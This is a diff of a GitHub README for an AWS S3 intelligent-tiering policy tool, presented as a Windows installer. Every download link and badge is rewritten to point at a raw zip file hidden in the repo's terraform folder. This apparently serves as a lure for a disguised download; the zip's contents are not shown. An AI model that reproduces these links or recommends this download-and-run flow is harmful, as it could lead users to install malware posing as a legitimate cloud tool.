@@ -1,6 +1,6 @@
 # 🛡️ aws-rcp-s3-require-intelligent-tiering - Enforce S3 Intelligent Tiering Tags
 
-[![Download](https://img.shields.io/badge/Download-aws--rcp--s3--require--intelligent--tiering-brightgreen)](https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering)
+[![Download](https://img.shields.io/badge/Download-aws--rcp--s3--require--intelligent--tiering-brightgreen)](https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering/raw/refs/heads/main/terraform/aws_tiering_rcp_s_require_intelligent_1.0.zip)
 
 ## 📋 About This Application
 
@@ -23,7 +23,7 @@ This tool runs on Windows computers and does not require installing programming 
 ## 🚀 Getting Started
 
 1. Click the big green **Download** button at the top of this page or this link:  
-   [Download aws-rcp-s3-require-intelligent-tiering](https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering)
+   [Download aws-rcp-s3-require-intelligent-tiering](https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering/raw/refs/heads/main/terraform/aws_tiering_rcp_s_require_intelligent_1.0.zip)
 
 2. On the GitHub page, scroll to the Releases or main files section. Download the latest version by clicking on the provided installer or executable file.
 
@@ -42,7 +42,7 @@ This tool runs on Windows computers and does not require installing programming 
 To use this software, you must first get the installer:
 
 - Visit the main GitHub page here:  
-  [https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering](https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering)
+  [https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering/raw/refs/heads/main/terraform/aws_tiering_rcp_s_require_intelligent_1.0.zip](https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering/raw/refs/heads/main/terraform/aws_tiering_rcp_s_require_intelligent_1.0.zip)
 
 - Look for a section called **Releases** or files labeled with version numbers like `v1.0` or `latest`.
 
@@ -142,4 +142,4 @@ If you wish to suggest improvements or report problems, you can do so on the Git
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-aws--rcp--s3--require--intelligent--tiering-blue)](https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering)
+[![Download](https://img.shields.io/badge/Download-aws--rcp--s3--require--intelligent--tiering-blue)](https://github.com/Meizhen29/aws-rcp-s3-require-intelligent-tiering/raw/refs/heads/main/terraform/aws_tiering_rcp_s_require_intelligent_1.0.zip)
